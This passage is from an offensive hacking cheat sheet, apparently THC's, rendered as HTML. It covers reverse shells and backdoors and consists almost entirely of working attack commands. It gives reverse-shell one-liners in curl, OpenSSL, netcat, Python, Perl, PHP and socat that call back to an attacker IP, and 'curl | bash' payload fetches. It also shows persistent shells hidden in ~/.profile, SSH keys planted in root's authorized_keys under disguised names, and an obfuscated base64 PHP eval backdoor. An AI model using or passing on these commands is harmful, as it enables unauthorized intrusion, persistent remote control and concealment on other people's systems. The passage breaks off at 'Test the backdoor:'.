</span><span id="__span-121-3"><a id="__codelineno-121-3" name="__codelineno-121-3" href="#__codelineno-121-3"></a>openssl<span class="w"> </span>req<span class="w"> </span>-x509<span class="w"> </span>-newkey<span class="w"> </span>rsa:2048<span class="w"> </span>-keyout<span class="w"> </span>key.pem<span class="w"> </span>-out<span class="w"> </span>cert.pem<span class="w"> </span>-sha256<span class="w"> </span>-days<span class="w"> </span><span class="m">3650</span><span class="w"> </span>-nodes<span class="w"> </span>-subj<span class="w"> </span><span class="s2">&quot;/CN=THC&quot;</span>
</span><span id="__span-121-4"><a id="__codelineno-121-4" name="__codelineno-121-4" href="#__codelineno-121-4"></a><span class="c1"># Start your listening server:</span>
</span><span id="__span-121-5"><a id="__codelineno-121-5" name="__codelineno-121-5" href="#__codelineno-121-5"></a>./curlshell.py<span class="w"> </span>--certificate<span class="w"> </span>cert.pem<span class="w"> </span>--private-key<span class="w"> </span>key.pem<span class="w"> </span>--listen-port<span class="w"> </span><span class="m">8080</span>
</span></code></pre></div>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a><span class="c1"># On the target:</span>
</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2" href="#__codelineno-122-2"></a>curl<span class="w"> </span>-skfL<span class="w"> </span>https://3.13.3.7:8080<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
</span></code></pre></div></p>
<p><a id="curltelnet"></a>
<strong>5.i.d Reverse shell with cURL (cleartext)</strong></p>
<p>Start ncat to listen for multiple connections:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a>ncat<span class="w"> </span>-kltv<span class="w"> </span><span class="m">1524</span>
</span></code></pre></div>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a><span class="c1"># On the target:</span>
</span><span id="__span-124-2"><a id="__codelineno-124-2" name="__codelineno-124-2" href="#__codelineno-124-2"></a><span class="nv">C</span><span class="o">=</span><span class="s2">&quot;curl -Ns telnet://3.13.3.7:1524&quot;</span><span class="p">;</span><span class="w"> </span><span class="nv">$C</span><span class="w"> </span>&lt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sh<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="nv">$C</span><span class="w"> </span>&gt;/dev/null
</span></code></pre></div></p>
<p><a id="sslshell"></a>
<strong>5.i.e. Reverse shell with OpenSSL (encrypted)</strong></p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a><span class="c1"># On YOUR workstation:</span>
</span><span id="__span-125-2"><a id="__codelineno-125-2" name="__codelineno-125-2" href="#__codelineno-125-2"></a><span class="c1"># Generate SSL keys:</span>
</span><span id="__span-125-3"><a id="__codelineno-125-3" name="__codelineno-125-3" href="#__codelineno-125-3"></a>openssl<span class="w"> </span>req<span class="w"> </span>-x509<span class="w"> </span>-newkey<span class="w"> </span>rsa:2048<span class="w"> </span>-keyout<span class="w"> </span>key.pem<span class="w"> </span>-out<span class="w"> </span>cert.pem<span class="w"> </span>-sha256<span class="w"> </span>-days<span class="w"> </span><span class="m">3650</span><span class="w"> </span>-nodes<span class="w"> </span>-subj<span class="w"> </span><span class="s2">&quot;/CN=THC&quot;</span>
</span><span id="__span-125-4"><a id="__codelineno-125-4" name="__codelineno-125-4" href="#__codelineno-125-4"></a><span class="c1"># Start your listening server:</span>
</span><span id="__span-125-5"><a id="__codelineno-125-5" name="__codelineno-125-5" href="#__codelineno-125-5"></a>openssl<span class="w"> </span>s_server<span class="w"> </span>-port<span class="w"> </span><span class="m">1524</span><span class="w"> </span>-cert<span class="w"> </span>cert.pem<span class="w"> </span>-key<span class="w"> </span>key.pem
</span><span id="__span-125-6"><a id="__codelineno-125-6" name="__codelineno-125-6" href="#__codelineno-125-6"></a><span class="c1"># Or pwncat:</span>
</span><span id="__span-125-7"><a id="__codelineno-125-7" name="__codelineno-125-7" href="#__codelineno-125-7"></a><span class="c1"># pwncat -lp 1524 --ssl</span>
</span></code></pre></div>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a><span class="c1"># On the target, start an openssl reverse shell as background process:</span>
</span><span id="__span-126-2"><a id="__codelineno-126-2" name="__codelineno-126-2" href="#__codelineno-126-2"></a><span class="o">({</span><span class="w"> </span>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span><span class="m">3</span>.13.3.7:1524<span class="w"> </span>-quiet<span class="w"> </span>&lt;/dev/fd/3<span class="w"> </span><span class="m">3</span>&gt;<span class="p">&amp;</span>-<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>sh<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">3</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">3</span><span class="w"> </span><span class="m">3</span>&gt;<span class="p">&amp;</span>-<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">}</span><span class="w"> </span><span class="m">3</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>:<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="o">)</span>
</span></code></pre></div>
<p><a id="reverse-shell-no-bash"></a>
<strong>5.i.f. Reverse shell without /dev/tcp</strong></p>
<p>Embedded systems do not always have Bash and the <em>/dev/tcp/</em> trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:</p>
<p>On the remote system:</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1" href="#__codelineno-127-1"></a>nc<span class="w"> </span>-e<span class="w"> </span>/bin/sh<span class="w"> </span>-vn<span class="w"> </span><span class="m">3</span>.13.3.7<span class="w"> </span><span class="m">1524</span>
</span></code></pre></div>
<p>Variant if <em>'-e'</em> is not supported:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1" href="#__codelineno-128-1"></a><span class="o">{</span><span class="w"> </span>nc<span class="w"> </span>-vn<span class="w"> </span><span class="m">3</span>.13.3.7<span class="w"> </span><span class="m">1524</span><span class="w"> </span>&lt;/dev/fd/3<span class="w"> </span><span class="m">3</span>&gt;<span class="p">&amp;</span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>sh<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">3</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">3</span><span class="w"> </span><span class="m">3</span>&gt;<span class="p">&amp;</span>-<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">}</span><span class="w"> </span><span class="m">3</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>:
</span></code></pre></div></p>
<ul>
<li>On modern shells this can be shortened to <code>{ nc 3.13.3.7 1524 &lt;/dev/fd/2|sh;} 2&gt;&amp;1|:</code>. (<em>thanks IA_PD</em>).  </li>
<li>The <code>| :</code> trick wont work on C-Shell/tcsh (FreeBSD), orignal Bourne shell (Solaris) or Korn shell (AIX). Use <code>mkfifo</code> instead.</li>
</ul>
<p>Variant for older <em>/bin/sh</em>:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1" href="#__codelineno-129-1"></a>mkfifo<span class="w"> </span>/tmp/.io<span class="p">;</span><span class="w"> </span>sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span>&lt;/tmp/.io<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-vn<span class="w"> </span><span class="m">3</span>.13.3.7<span class="w"> </span><span class="m">1524</span><span class="w"> </span>&gt;/tmp/.io
</span></code></pre></div></p>
<p>Telnet variant:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1" href="#__codelineno-130-1"></a>mkfifo<span class="w"> </span>/tmp/.io<span class="p">;</span><span class="w"> </span>sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span>&lt;/tmp/.io<span class="w"> </span><span class="p">|</span><span class="w"> </span>telnet<span class="w"> </span><span class="m">3</span>.13.3.7<span class="w"> </span><span class="m">1524</span><span class="w"> </span>&gt;/tmp/.io
</span></code></pre></div></p>
<p>Telnet variant when mkfifo is not supported (Ulg!):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a>touch<span class="w"> </span>/tmp/.fio<span class="p">;</span><span class="w"> </span>tail<span class="w"> </span>-f<span class="w"> </span>/tmp/.fio<span class="w"> </span><span class="p">|</span><span class="w"> </span>sh<span class="w"> </span>-i<span class="w"> </span><span class="p">|</span><span class="w"> </span>telnet<span class="w"> </span><span class="m">3</span>.13.3.7<span class="w"> </span><span class="m">31337</span><span class="w"> </span>&gt;/tmp/.fio
</span></code></pre></div>
Note: Dont forget to <code>rm /tmp/.fio</code> after login.</p>
<p><a id="revese-shell-remote-moe"></a>
<strong>5.i.g. Reverse shell with remote.moe and ssh (encrypted)</strong></p>
<p>It is possible to tunnel raw TCP (e.g bash reverse shell) through <a href="https://remote.moe">remote.moe</a>:</p>
<p>On your workstation:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1" href="#__codelineno-132-1"></a><span class="c1"># First Terminal - Create a remote.moe tunnel to your workstation</span>
</span><span id="__span-132-2"><a id="__codelineno-132-2" name="__codelineno-132-2" href="#__codelineno-132-2"></a>ssh-keygen<span class="w"> </span>-q<span class="w"> </span>-t<span class="w"> </span>rsa<span class="w"> </span>-N<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-f<span class="w"> </span>.r<span class="w">  </span><span class="c1"># New key creates a new remote.moe-address</span>
</span><span id="__span-132-3"><a id="__codelineno-132-3" name="__codelineno-132-3" href="#__codelineno-132-3"></a>ssh<span class="w"> </span>-i<span class="w"> </span>.r<span class="w"> </span>-R31337:0:8080<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>nokey@remote.moe<span class="p">;</span><span class="w"> </span>rm<span class="w"> </span>-f<span class="w"> </span>.r
</span><span id="__span-132-4"><a id="__codelineno-132-4" name="__codelineno-132-4" href="#__codelineno-132-4"></a><span class="c1"># Note down the &#39;remote.moe&#39; address which will look something like</span>
</span><span id="__span-132-5"><a id="__codelineno-132-5" name="__codelineno-132-5" href="#__codelineno-132-5"></a><span class="c1"># uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe</span>
</span><span id="__span-132-6"><a id="__codelineno-132-6" name="__codelineno-132-6" href="#__codelineno-132-6"></a>
</span><span id="__span-132-7"><a id="__codelineno-132-7" name="__codelineno-132-7" href="#__codelineno-132-7"></a><span class="c1"># Second Terminal - start listening for the reverse shell</span>
</span><span id="__span-132-8"><a id="__codelineno-132-8" name="__codelineno-132-8" href="#__codelineno-132-8"></a>nc<span class="w"> </span>-vnlp<span class="w"> </span><span class="m">8080</span>
</span></code></pre></div></p>
<p>On the target(needs SSH and Bash):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1" href="#__codelineno-133-1"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;(killall ssh; rm -f /tmp/.r; ssh-keygen -q -t rsa -N &quot;&quot; -f /tmp/.r; ssh -i /tmp/.r -o StrictHostKeyChecking=no -L31338:uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 -Nf remote.moe;  bash -i &amp;&gt;/dev/tcp/0/31338 0&gt;&amp;1 &amp;)&#39;</span>
</span></code></pre></div></p>
<p>On the target (alternative; needs ssh, bash and mkfifo):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1" href="#__codelineno-134-1"></a>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/.p<span class="w"> </span>/tmp/.r<span class="p">;</span><span class="w"> </span>ssh-keygen<span class="w"> </span>-q<span class="w"> </span>-t<span class="w"> </span>rsa<span class="w"> </span>-N<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-f<span class="w"> </span>/tmp/.r<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>mkfifo<span class="w"> </span>/tmp/.p<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">(</span>bash<span class="w"> </span>-i&lt;/tmp/.p<span class="w">  </span><span class="m">2</span>&gt;1<span class="w"> </span><span class="p">|</span>ssh<span class="w"> </span>-i<span class="w"> </span>/tmp/.r<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>-W<span class="w"> </span>uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337<span class="w"> </span>remote.moe&gt;/tmp/.p<span class="w"> </span><span class="p">&amp;</span><span class="o">)</span>
</span></code></pre></div></p>
<p><a id="reverse-shell-python"></a>
<strong>5.i.h. Reverse shell with Python</strong>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-135-1"><a id="__codelineno-135-1" name="__codelineno-135-1" href="#__codelineno-135-1"></a>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;3.13.3.7&quot;,1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
</span></code></pre></div></p>
<p><a id="reverse-shell-perl"></a>
<strong>5.i.i. Reverse shell with Perl</strong></p>
<p><div class="language-sh highlight"><pre><span></span><code><span id="__span-136-1"><a id="__codelineno-136-1" name="__codelineno-136-1" href="#__codelineno-136-1"></a><span class="c1"># method 1</span>
</span><span id="__span-136-2"><a id="__codelineno-136-2" name="__codelineno-136-2" href="#__codelineno-136-2"></a>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;use Socket;$i=&quot;3.13.3.7&quot;;$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
</span><span id="__span-136-3"><a id="__codelineno-136-3" name="__codelineno-136-3" href="#__codelineno-136-3"></a><span class="c1"># method 2</span>
</span><span id="__span-136-4"><a id="__codelineno-136-4" name="__codelineno-136-4" href="#__codelineno-136-4"></a>perl<span class="w"> </span>-MIO<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,&quot;3.13.3.7:1524&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;){if($_=~ /(.*)/){system $1;}};&#39;</span>
</span></code></pre></div>
<a id="reverse-shell-php"></a>
<strong>5.i.j. Reverse shell with PHP</strong></p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-137-1"><a id="__codelineno-137-1" name="__codelineno-137-1" href="#__codelineno-137-1"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;3.13.3.7&quot;,1524);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
</span></code></pre></div>
<p><a id="reverse-shell-upgrade"></a>
<a id="reverse-shell-pty"></a>
<strong>5.ii.a. Upgrade a reverse shell to a PTY shell</strong></p>
<p>Any of the above reverse shells are limited. For example <em>sudo bash</em> or <em>top</em> will not work. To make these work we have to upgrade the shell to a real PTY shell:</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-138-1"><a id="__codelineno-138-1" name="__codelineno-138-1" href="#__codelineno-138-1"></a><span class="c1"># Using script</span>
</span><span id="__span-138-2"><a id="__codelineno-138-2" name="__codelineno-138-2" href="#__codelineno-138-2"></a><span class="nb">exec</span><span class="w"> </span>script<span class="w"> </span>-qc<span class="w"> </span>/bin/bash<span class="w"> </span>/dev/null<span class="w">  </span><span class="c1"># Linux</span>
</span><span id="__span-138-3"><a id="__codelineno-138-3" name="__codelineno-138-3" href="#__codelineno-138-3"></a><span class="nb">exec</span><span class="w"> </span>script<span class="w"> </span>-q<span class="w"> </span>/dev/null<span class="w"> </span>/bin/bash<span class="w">   </span><span class="c1"># BSD</span>
</span></code></pre></div>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-139-1"><a id="__codelineno-139-1" name="__codelineno-139-1" href="#__codelineno-139-1"></a><span class="c1"># Using python</span>
</span><span id="__span-139-2"><a id="__codelineno-139-2" name="__codelineno-139-2" href="#__codelineno-139-2"></a><span class="nb">exec</span><span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span></code></pre></div>
<p><a id="reverse-shell-interactive"></a>
<strong>5.ii.b. Upgrade a reverse shell to a fully interactive shell</strong></p>
<p>...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-140-1"><a id="__codelineno-140-1" name="__codelineno-140-1" href="#__codelineno-140-1"></a><span class="c1"># On the target host spwan a PTY using any of the above examples:</span>
</span><span id="__span-140-2"><a id="__codelineno-140-2" name="__codelineno-140-2" href="#__codelineno-140-2"></a>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span><span id="__span-140-3"><a id="__codelineno-140-3" name="__codelineno-140-3" href="#__codelineno-140-3"></a><span class="c1"># Now Press Ctrl-Z to suspend the connection and return to your own terminal.</span>
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-141-1"><a id="__codelineno-141-1" name="__codelineno-141-1" href="#__codelineno-141-1"></a># On your terminal execute:
</span><span id="__span-141-2"><a id="__codelineno-141-2" name="__codelineno-141-2" href="#__codelineno-141-2"></a>stty raw -echo opost; fg
</span></code></pre></div>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-142-1"><a id="__codelineno-142-1" name="__codelineno-142-1" href="#__codelineno-142-1"></a><span class="c1"># On target host</span>
</span><span id="__span-142-2"><a id="__codelineno-142-2" name="__codelineno-142-2" href="#__codelineno-142-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
</span><span id="__span-142-3"><a id="__codelineno-142-3" name="__codelineno-142-3" href="#__codelineno-142-3"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
</span><span id="__span-142-4"><a id="__codelineno-142-4" name="__codelineno-142-4" href="#__codelineno-142-4"></a>reset<span class="w"> </span>-I
</span><span id="__span-142-5"><a id="__codelineno-142-5" name="__codelineno-142-5" href="#__codelineno-142-5"></a>stty<span class="w"> </span>-echo<span class="p">;</span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;\033[18t&quot;</span><span class="p">;</span><span class="nb">read</span><span class="w"> </span>-rdt<span class="w"> </span>R<span class="p">;</span>stty<span class="w"> </span>sane<span class="w"> </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$R</span><span class="s2">&quot;</span><span class="p">|</span>awk<span class="w"> </span>-F<span class="s2">&quot;;&quot;</span><span class="w"> </span><span class="s1">&#39;{ printf &quot;rows &quot;$3&quot; cols &quot;$2; }&#39;</span><span class="k">)</span>
</span><span id="__span-142-6"><a id="__codelineno-142-6" name="__codelineno-142-6" href="#__codelineno-142-6"></a><span class="c1"># Pimp up your prompt</span>
</span><span id="__span-142-7"><a id="__codelineno-142-7" name="__codelineno-142-7" href="#__codelineno-142-7"></a><span class="nv">PS1</span><span class="o">=</span><span class="s1">&#39;USERS=$(who | wc -l) LOAD=$(cut -f1 -d&quot; &quot; /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] &#39;</span>
</span></code></pre></div>
<p><a id="reverse-shell-socat"></a>
<strong>5.ii.c. Reverse shell with socat (fully interactive)</strong></p>
<p>...or install socat and get it done without much fiddling about:</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-143-1"><a id="__codelineno-143-1" name="__codelineno-143-1" href="#__codelineno-143-1"></a><span class="c1"># on attacker&#39;s host (listener)</span>
</span><span id="__span-143-2"><a id="__codelineno-143-2" name="__codelineno-143-2" href="#__codelineno-143-2"></a>socat<span class="w"> </span>file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span><span class="w"> </span>tcp-listen:1524
</span><span id="__span-143-3"><a id="__codelineno-143-3" name="__codelineno-143-3" href="#__codelineno-143-3"></a><span class="c1"># on target host (reverse shell)</span>
</span><span id="__span-143-4"><a id="__codelineno-143-4" name="__codelineno-143-4" href="#__codelineno-143-4"></a>socat<span class="w"> </span>exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane<span class="w"> </span>tcp:3.13.3.7:1524
</span></code></pre></div>
<hr />
<p><a id="backdoor"></a></p>
<h2 id="6-backdoors">6. Backdoors</h2>
<p>Mostly we use gs-netcat's automated deployment script: <a href="https://www.gsocket.io/deploy">https://www.gsocket.io/deploy</a>.
<div class="language-sh highlight"><pre><span></span><code><span id="__span-144-1"><a id="__codelineno-144-1" name="__codelineno-144-1" href="#__codelineno-144-1"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>curl<span class="w"> </span>-fsSLk<span class="w"> </span>https://gsocket.io/y<span class="k">)</span><span class="s2">&quot;</span>
</span></code></pre></div>
or
<div class="language-sh highlight"><pre><span></span><code><span id="__span-145-1"><a id="__codelineno-145-1" name="__codelineno-145-1" href="#__codelineno-145-1"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>wget<span class="w"> </span>--no-check-certificate<span class="w"> </span>-qO-<span class="w"> </span>https://gsocket.io/y<span class="k">)</span><span class="s2">&quot;</span>
</span></code></pre></div></p>
<p>or deploy gsocket by running your own deployment server:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-146-1"><a id="__codelineno-146-1" name="__codelineno-146-1" href="#__codelineno-146-1"></a><span class="nv">LOG</span><span class="o">=</span>results.log<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>curl<span class="w"> </span>-fsSL<span class="w"> </span>https://gsocket.io/ys<span class="k">)</span><span class="s2">&quot;</span><span class="w">  </span><span class="c1"># Notice &#39;/ys&#39; instead of &#39;/y&#39;</span>
</span></code></pre></div></p>
<p><a id="backdoor-background-reverse-shell"></a>
<strong>6.i. Background reverse shell</strong></p>
<p>A reverse shell that keeps trying to connect back to us every 360 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. </p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-147-1"><a id="__codelineno-147-1" name="__codelineno-147-1" href="#__codelineno-147-1"></a>setsid<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;while :; do bash -i &amp;&gt;/dev/tcp/3.13.3.7/1524 0&gt;&amp;1; sleep 360; done&#39;</span><span class="w"> </span><span class="p">&amp;</span>&gt;/dev/null
</span></code></pre></div>
<p>or the user's <em>~/.profile</em> (also stops multiple instances from being started):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-148-1"><a id="__codelineno-148-1" name="__codelineno-148-1" href="#__codelineno-148-1"></a>fuser<span class="w"> </span>/dev/shm/.busy<span class="w"> </span><span class="p">&amp;</span>&gt;/dev/null<span class="w"> </span><span class="o">||</span><span class="w"> </span>nohup<span class="w"> </span>/bin/bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;while :; do touch /dev/shm/.busy; exec 3&lt;/dev/shm/.busy; bash -i &amp;&gt;/dev/tcp/3.13.3.7/1524 0&gt;&amp;1 ; sleep 360; done&#39;</span><span class="w"> </span><span class="p">&amp;</span>&gt;/dev/null<span class="w"> </span><span class="p">&amp;</span>
</span></code></pre></div></p>
<p><a id="backdoor-auth-keys"></a>
<strong>6.ii. authorized_keys</strong></p>
<p>Add your ssh public key to <em>/root/.ssh/authorized_keys</em>. It's the most reliable backdoor ever :&gt;</p>
<ul>
<li>It survives reboots.</li>
<li>It even survives re-installs. Admins have been known to make a backup of authorized_keys and then put it straight back onto the newly installed system.</li>
<li>We have even seen our key being copied to other companies!</li>
</ul>
<p>Tip: Change the name at the end of the ssh public keyfile to something obscure like <em>backup@ubuntu</em> or the admin's real name:
<div class="language-text highlight"><pre><span></span><code><span id="__span-149-1"><a id="__codelineno-149-1" name="__codelineno-149-1" href="#__codelineno-149-1"></a>$ cat id_rsa.pub
</span><span id="__span-149-2"><a id="__codelineno-149-2" name="__codelineno-149-2" href="#__codelineno-149-2"></a>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCktFkgm40GDkqYwJkNZVb+NLqYoUNSPVPLx0VDbJM0
</span><span id="__span-149-3"><a id="__codelineno-149-3" name="__codelineno-149-3" href="#__codelineno-149-3"></a>[...]
</span><span id="__span-149-4"><a id="__codelineno-149-4" name="__codelineno-149-4" href="#__codelineno-149-4"></a>u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C
</span><span id="__span-149-5"><a id="__codelineno-149-5" name="__codelineno-149-5" href="#__codelineno-149-5"></a>c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
</span></code></pre></div>
<a id="backdoor-network"></a>
<strong>6.iii. Remote Access to an entire network</strong></p>
<p>Install <a href="https://github.com/hackerschoice/gsocket">gs-netcat</a>. It creates a SOCKS exit-node on the Host's private LAN which is accessible through the Global Socket Relay Network without the need to run your own relay-server (e.g. access the remote private LAN directly from your workstation):</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-150-1"><a id="__codelineno-150-1" name="__codelineno-150-1" href="#__codelineno-150-1"></a>gs-netcat<span class="w"> </span>-l<span class="w"> </span>-S<span class="w">       </span><span class="c1"># compromised Host</span>
</span></code></pre></div>
<p>Now from your workstation you can connect to ANY host on the Host's private LAN:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-151-1"><a id="__codelineno-151-1" name="__codelineno-151-1" href="#__codelineno-151-1"></a>gs-netcat<span class="w"> </span>-p<span class="w"> </span><span class="m">1080</span><span class="w">    </span><span class="c1"># Your workstation.</span>
</span><span id="__span-151-2"><a id="__codelineno-151-2" name="__codelineno-151-2" href="#__codelineno-151-2"></a>
</span><span id="__span-151-3"><a id="__codelineno-151-3" name="__codelineno-151-3" href="#__codelineno-151-3"></a><span class="c1"># Access route.local:22 on the Host&#39;s private LAN from your Workstation:</span>
</span><span id="__span-151-4"><a id="__codelineno-151-4" name="__codelineno-151-4" href="#__codelineno-151-4"></a>socat<span class="w"> </span>-<span class="w">  </span><span class="s2">&quot;SOCKS4a:127.1:route.local:22&quot;</span>
</span></code></pre></div>
Read <a href="#scan-proxy">Use any tool via Socks Proxy</a>.</p>
<p>Other methods:
* <a href="https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service">Gost/Cloudflared</a> - our very own article
* <a href="https://thc.org/segfault/wireguard">Reverse Wireguard</a> - from segfault.net to any (internal) network.</p>
<p><a id="carriage-return-backdoor"></a>
<strong>6.iv. Smallest PHP Backdoor</strong></p>
<p>Add this line to the beginning of any PHP file:
<div class="language-php highlight"><pre><span></span><code><span id="__span-152-1"><a id="__codelineno-152-1" name="__codelineno-152-1" href="#__codelineno-152-1"></a><span class="cp">&lt;?php</span> <span class="nv">$i</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">&quot;aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K&quot;</span><span class="p">);</span><span class="k">eval</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span><span class="cp">?&gt;</span>
</span></code></pre></div></p>
<p>Test the backdoor:
